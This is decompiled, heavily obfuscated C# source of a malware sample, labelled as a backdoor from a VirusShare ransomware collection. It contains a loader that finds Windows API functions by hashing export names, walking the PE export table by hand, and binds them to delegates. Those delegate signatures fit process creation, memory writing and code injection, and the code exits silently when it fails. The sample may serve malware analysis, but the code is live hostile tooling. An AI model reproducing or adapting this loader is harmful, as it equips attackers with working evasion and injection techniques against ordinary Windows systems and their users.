// Decompiled with JetBrains decompiler
// Type: %IEW1W).#)V&.-@0K
// Assembly: WI-, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 39C1D42E-5B95-445C-A616-1A2ECFEC41CE
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Backdoor.Win32.Generic-ee6c98579799200a7b6cdc1ce77a6984ce5c34b633b9fbda225db62f194a61a2.exe

using \u0025\u001CIEW1W\u0029.\u0023\u0019\u0029\u0016\u0016\u0084V\u0026;
using SUI._Core;
using System;
using System.Reflection;
using System.Runtime.InteropServices;

namespace \u0025\u001CIEW1W\u0029.\u0023\u0019\u0029\u0016\u0016\u0084V\u0026
{
  internal class \u002D\u00400K\u000B\u0003
  {
    private static uint \u0018\u0010\u0017 = 3635984;

    public static void V\u002B\u00287(object _param0)
    {
      \u002D\u00400K\u000B\u0003.\u0033\u0023\u0013.\u003Fm.\u0012\u001D\u0003 = \u002D\u00400K\u000B\u0003.\u0012M\u00094(\u003CPrivateImplementationDetails\u003E\u007B4D695705\u002D4CD3\u002D4D2B\u002D9788\u002DB76714571491\u007D.\u0012\u0005());
      \u002D\u00400K\u000B\u0003.\u0033\u0023\u0013.\u0022\u001FTu\u001D\u0019\u0004\u0012\u000F.\u0034\u003C\u0040 = \u002D\u00400K\u000B\u0003.\u0012M\u00094(\u003CPrivateImplementationDetails\u003E\u007B4D695705\u002D4CD3\u002D4D2B\u002D9788\u002DB76714571491\u007D.\u005C\u0001\u0007\u0004\u0040());
      \u002D\u00400K\u000B\u0003.\u0033\u0023\u0013.A\u0014G\u0003\u000D.X\u009D\u001E = \u002D\u00400K\u000B\u0003.\u0012M\u00094(\u003CPrivateImplementationDetails\u003E\u007B4D695705\u002D4CD3\u002D4D2B\u002D9788\u002DB76714571491\u007D.F\u003C\u0087\u002AR());
      try
      {
        foreach (Type nestedType in typeof (\u002D\u00400K\u000B\u0003.\u0033\u0023\u0013).GetNestedTypes())
        {
          FieldInfo[] fields = nestedType.GetFields();
          for (int index = 2; index < fields.Length; ++index)
            fields[index].SetValue((object) null, typeof (Marshal).GetMethod(\u003CPrivateImplementationDetails\u003E\u007B4D695705\u002D4CD3\u002D4D2B\u002D9788\u002DB76714571491\u007D.\u0020\u001B\u0001\u0040\u000A\u0013\u0005\u005C\u0016(), BindingFlags.Static | BindingFlags.NonPublic).Invoke((object) null, new object[2]
            {
              (object) \u002D\u00400K\u000B\u0003.\u0021\u0014\u0040((uint) fields[0].GetValue((object) null), ((uint[]) fields[1].GetValue((object) null))[index - 2]),
              (object) fields[index].FieldType
            }));
        }
      }
      catch
      {
        Environment.Exit(0);
      }
      \u003C\u0040\u0014\u001E5.\u0032\u0010j\u003BX\u0007\u0027();
      \u005E\u001D.OO\u0008\u0027a\u0090I\u002E\u003C(_param0);
    }

    private static unsafe IntPtr \u0021\u0014\u0040(uint _param0, uint _param1)
    {
      try
      {
        uint num = _param0 + *(uint*) ((int) _param0 + (int) *(uint*) (_param0 + 60U) + 120);
        for (uint index = 0; index < _param0 + *(uint*) (num + 24U); ++index)
        {
          if ((int) \u002D\u00400K\u000B\u0003.\u0032\u001D(Marshal.PtrToStringAnsi((IntPtr) (long) (_param0 + *(uint*) ((IntPtr) (_param0 + *(uint*) (num + 32U)) + (IntPtr) index * 4)))) == (int) _param1)
            return (IntPtr) (long) (_param0 + *(uint*) ((IntPtr) (_param0 + *(uint*) (num + 28U)) + (IntPtr) *(ushort*) ((IntPtr) (_param0 + *(uint*) (num + 36U)) + (IntPtr) index * 2) * 4));
        }
      }
      catch
      {
      }
      return IntPtr.Zero;
    }

    private static uint \u0032\u001D(string _param0)
    {
      uint num = \u002D\u00400K\u000B\u0003.\u0018\u0010\u0017;
      for (int index = 0; index < _param0.Length; ++index)
        num = (num << 5) + num + (uint) _param0[index];
      return num;
    }

    [DllImport("kernel32", EntryPoint = "LoadLibrary")]
    private static extern uint \u0012M\u00094(string _param0);

    public delegate bool \u0007\u0001\u002D(
      IntPtr _param1,
      int _param2,
      ref IntPtr _param3,
      uint _param4,
      object _param5);

    public delegate uint \u0017\u001D\u0027(IntPtr _param1, IntPtr _param2);

    public delegate IntPtr \u002D\u0014\u000A\u0011M\u0018(IntPtr _param1, IntPtr _param2);

    public delegate uint \u001F\u000B\u000B\u0001\u0002(IntPtr _param1, IntPtr _param2);

    public delegate IntPtr \u000B\u000B\u001D\u0013Q\u001DK\u0098();

    public delegate void \u003D\u003B\u000FM(uint _param1);

    [StructLayout(LayoutKind.Sequential, Size = 1)]
    public struct \u0033\u0023\u0013
    {
      [StructLayout(LayoutKind.Sequential, Size = 1)]
      public struct \u0022\u001FTu\u001D\u0019\u0004\u0012\u000F
      {
        public static uint \u0034\u003C\u0040;
        public static uint[] \u0035b\u0040 = new uint[3]
        {
          419175912U,
          3446012710U,
          801665757U
        };
        public static \u002D\u00400K\u000B\u0003.\u0038\u0009B \u0020\u0020\u001C\u0013\u000C\u0024\u0016\u0006M = (\u002D\u00400K\u000B\u0003.\u0038\u0009B) null;
        public static \u002D\u00400K\u000B\u0003.f\u0010\u0019\u000C\u0001z \u003EE\u001C = (\u002D\u00400K\u000B\u0003.f\u0010\u0019\u000C\u0001z) null;
        public static \u002D\u00400K\u000B\u0003.j\u000D \u001D\u0006\u007D = (\u002D\u00400K\u000B\u0003.j\u000D) null;
      }

      [StructLayout(LayoutKind.Sequential, Size = 1)]
      public struct \u003Fm
      {
        public static uint \u0012\u001D\u0003;
        public static uint[] \u0012j\u0098J = new uint[8]
        {
          2848975918U,
          3639205065U,
          741413522U,
          3170421626U,
          3233803824U,
          779364312U,
          1710252321U,
          442189224U
        };
        public static \u002D\u00400K\u000B\u0003.F\u0004C\u0018 \u009D\u0017R\u0011\u00030\u0026J = (\u002D\u00400K\u000B\u0003.F\u0004C\u0018) null;
        public static \u002D\u00400K\u000B\u0003.\u003D\u003B\u000FM kl\u0021O\u0010C\u001E = (\u002D\u00400K\u000B\u0003.\u003D\u003B\u000FM) null;
        public static \u002D\u00400K\u000B\u0003.\u000B\u000B\u001D\u0013Q\u001DK\u0098 \u0015Ce = (\u002D\u00400K\u000B\u0003.\u000B\u000B\u001D\u0013Q\u001DK\u0098) null;
        public static \u002D\u00400K\u000B\u0003.\u0036\u0023\u0084\u0027g\u0024J\u002E \u0087\u000E\u0016\u0004\u001B = (\u002D\u00400K\u000B\u0003.\u0036\u0023\u0084\u0027g\u0024J\u002E) null;
        public static \u002D\u00400K\u000B\u0003.S\u0029 \u0018K = (\u002D\u00400K\u000B\u0003.S\u0029) null;
        public static \u002D\u00400K\u000B\u0003.\u002D\u0014\u000A\u0011M\u0018 \u0031\u0013\u0025 = (\u002D\u00400K\u000B\u0003.\u002D\u0014\u000A\u0011M\u0018) null;
        public static \u002D\u00400K\u000B\u0003.A\u005E8 E\u0026\u0023\u000D\u008A = (\u002D\u00400K\u000B\u0003.A\u005E8) null;
        public static \u002D\u00400K\u000B\u0003.\u001Bv\u0010\u0006 \u001575 = (\u002D\u00400K\u000B\u0003.\u001Bv\u0010\u0006) null;
      }

      [StructLayout(LayoutKind.Sequential, Size = 1)]
      public struct A\u0014G\u0003\u000D
      {
        public static uint X\u009D\u001E;
        public static uint[] \u000C\u0017\u0017\u003F\u000B\u0028\u0013\u007B = new uint[8]
        {
          640210125U,
          1346134385U,
          3529850424U,
          3679487223U,
          252236061U,
          874865935U,
          3332582299U,
          985586299U
        };
        public static \u002D\u00400K\u000B\u0003.\u0007\u0001\u002D kK = (\u002D\u00400K\u000B\u0003.\u0007\u0001\u002D) null;
        public static \u002D\u00400K\u000B\u0003.k\u0022K\u001B3 \u003C\u0010\u0021\u001A\u000F = (\u002D\u00400K\u000B\u0003.k\u0022K\u001B3) null;
        public static \u002D\u00400K\u000B\u0003.\u0001\u0091C\u0004\u002B\u0029 \u0022\u001D\u002C\u007B\u007F\u0023\u0006 = (\u002D\u00400K\u000B\u0003.\u0001\u0091C\u0004\u002B\u0029) null;
        public static \u002D\u00400K\u000B\u0003.N\u0024\u001Ev\u0006\u0006 \u0025I\u003A\u001DKY0 = (\u002D\u00400K\u000B\u0003.N\u0024\u001Ev\u0006\u0006) null;
        public static \u002D\u00400K\u000B\u0003.w\u0090 \u000F1\u0012i\u0008\u0028b = (\u002D\u00400K\u000B\u0003.w\u0090) null;
        public static \u002D\u00400K\u000B\u0003.\u0017\u001D\u0027 \u003E8\u00087\u001D\u0028\u0018\u001E\u0012 = (\u002D\u00400K\u000B\u0003.\u0017\u001D\u0027) null;
        public static \u002D\u00400K\u000B\u0003.q\u001A\u0009\u001E\u0013 \u0037\u0010 = (\u002D\u00400K\u000B\u0003.q\u001A\u0009\u001E\u0013) null;
        public static \u002D\u00400K\u000B\u0003.\u001F\u000B\u000B\u0001\u0002 \u0012\u001C\u0007\u0005\u002E = (\u002D\u00400K\u000B\u0003.\u001F\u000B\u000B\u0001\u0002) null;
      }
    }

    public delegate bool \u0036\u0023\u0084\u0027g\u0024J\u002E(
      [MarshalAs(UnmanagedType.LPWStr)] string _param1,
      [MarshalAs(UnmanagedType.LPWStr)] string _param2,
      IntPtr _param3,
      IntPtr _param4,
      bool _param5,
      uint _param6,
      IntPtr _param7,
      IntPtr _param8,
      byte[] _param9,
      int[] _param10);

    public delegate bool \u0038\u0009B(
      ref IntPtr _param1,
      IntPtr _param2,
      IntPtr _param3,
      uint _param4,
      uint _param5);

    public delegate IntPtr A\u005E8(IntPtr _param1);

    public delegate uint \u0001\u0091C\u0004\u002B\u0029(IntPtr _param1, IntPtr _param2);

    public delegate bool f\u0010\u0019\u000C\u0001z(
      IntPtr _param1,
      byte[] _param2,
      uint _param3,
      IntPtr _param4,
      uint _param5,
      out IntPtr _param6);

    public delegate bool F\u0004C\u0018(IntPtr _param1, byte[] _param2, int _param3);

    public delegate bool j\u000D(
      IntPtr _param1,
      IntPtr _param2,
      int _param3,
      uint _param4,
      byte[] _param5,
      ref uint _param6);

    public delegate bool k\u0022K\u001B3(
      uint _param1,
      IntPtr _param2,
      uint _param3,
      IntPtr _param4,
      uint _param5,
      out uint _param6);

    public delegate bool N\u0024\u001Ev\u0006\u0006(
      IntPtr _param1,
      ref IntPtr _param2,
      IntPtr _param3,
      ref IntPtr _param4,
      uint _param5,
      uint _param6);

    public delegate uint q\u001A\u0009\u001E\u0013(IntPtr _param1, IntPtr _param2);

    public delegate IntPtr S\u0029(IntPtr _param1, IntPtr _param2, IntPtr _param3);

    public delegate uint \u001Bv\u0010\u0006(IntPtr _param1, IntPtr _param2);

    public delegate uint w\u0090(
      IntPtr _param1,
      IntPtr _param2,
      IntPtr _param3,
      uint _param4,
      IntPtr _param5);
  }
}
